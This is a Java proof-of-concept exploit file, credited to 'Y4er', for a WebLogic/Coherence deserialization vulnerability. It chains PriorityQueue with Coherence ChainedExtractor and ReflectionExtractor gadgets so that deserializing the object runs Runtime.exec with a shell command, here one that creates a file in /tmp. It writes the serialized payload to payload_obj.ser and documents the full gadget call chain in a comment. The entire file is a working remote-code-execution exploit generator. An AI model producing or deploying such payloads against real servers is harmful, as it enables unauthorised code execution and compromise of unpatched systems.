import com.tangosol.coherence.reporter.extractor.ConstantExtractor;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.supeream.serial.Reflections;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
import java.util.concurrent.Callable;

/*
 * java.util.PriorityQueue.readObject()
  * java.util.PriorityQueue.heapify()
  * java.util.PriorityQueue.siftDown()
  * java.util.PriorityQueue.siftDownUsingComparator()
  * com.tangosol.util.extractor.AbstractExtractor.compare()
  * com.tangosol.util.extractor.MultiExtractor.extract()
  * com.tangosol.util.extractor.ChainedExtractor.extract()
  * Method.invoke()
  * Runtime.exec()
  *
  * PoC by Y4er
 */
public class Weblogic_2883
{
	public static void main(String args[]) throws Exception
	{
		ReflectionExtractor extractor = new ReflectionExtractor("getMethod", new Object[]{ "getRuntime", new Class[0] });
		ReflectionExtractor extractor2 = new ReflectionExtractor("invoke", new Object[]{ null, new Object[0] });
		ReflectionExtractor extractor3 = new ReflectionExtractor("exec", new Object[]{ new String[]{ "/bin/sh", "-c", "touch /tmp/blah_ze_blah" } });

		ValueExtractor extractors[] = { new ConstantExtractor(Runtime.class), extractor, extractor2, extractor3 };
		ChainedExtractor chainedExt = new ChainedExtractor(extractors);

		Class clazz = ChainedExtractor.class.getSuperclass();
		Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
		m_aExtractor.setAccessible(true);

		ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString", new Object[]{});
		ValueExtractor[] valueExtractors1 = new ValueExtractor[]{
			reflectionExtractor
		};

		ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);

		PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
		queue.add("1");
		queue.add("1");
		m_aExtractor.set(chainedExtractor1, valueExtractors);

		Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = Runtime.class;
		queueArray[1] = "1";


		FileOutputStream fos = new FileOutputStream("payload_obj.ser");
		ObjectOutputStream os = new ObjectOutputStream(fos);
		os.writeObject(queue);
		os.close();
	}
}
